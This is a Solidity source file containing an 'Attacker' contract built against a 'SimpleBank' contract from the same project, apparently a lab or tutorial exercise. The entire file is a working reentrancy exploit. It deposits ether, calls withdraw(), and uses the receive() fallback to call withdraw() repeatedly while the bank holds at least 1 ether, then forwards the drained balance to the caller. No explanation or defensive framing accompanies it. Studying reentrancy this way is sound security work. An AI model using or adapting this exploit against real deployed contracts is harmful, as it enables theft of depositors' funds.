// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import { SimpleBank } from "./SimpleBank.sol";

contract Attacker {
    SimpleBank simpleBank;

    constructor(address _simpleBankAddress) {
        simpleBank = SimpleBank(_simpleBankAddress);
    }

    function attack() external payable {
        simpleBank.deposit{value: msg.value}();
        simpleBank.withdraw();
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer Failed");
    }

    receive() external payable {
        if (address(simpleBank).balance >= 1 ether) {
            simpleBank.withdraw();
        }
    }
}